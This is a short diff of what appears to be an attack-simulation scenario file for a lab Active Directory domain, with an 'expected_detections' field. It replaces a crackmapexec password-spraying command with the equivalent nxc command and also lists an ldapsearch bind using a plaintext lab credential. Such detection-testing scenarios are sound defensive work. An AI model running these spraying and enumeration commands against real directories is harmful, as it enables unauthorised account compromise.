@@ -45,7 +45,7 @@ steps:
     description: Use password spraying against AD to find accounts with weak passwords.
     target: ad
     commands:
-      - "crackmapexec smb 172.20.2.10 -u users.txt -p passwords.txt --continue-on-success"
+      - "nxc smb 172.20.2.10 -u users.txt -p passwords.txt --continue-on-success"
       - "ldapsearch -x -H ldap://172.20.2.10 -D 'jessica.williams@techvault.local' -w 'password123' -b 'DC=techvault,DC=local'"
     prerequisites: []
     expected_detections:
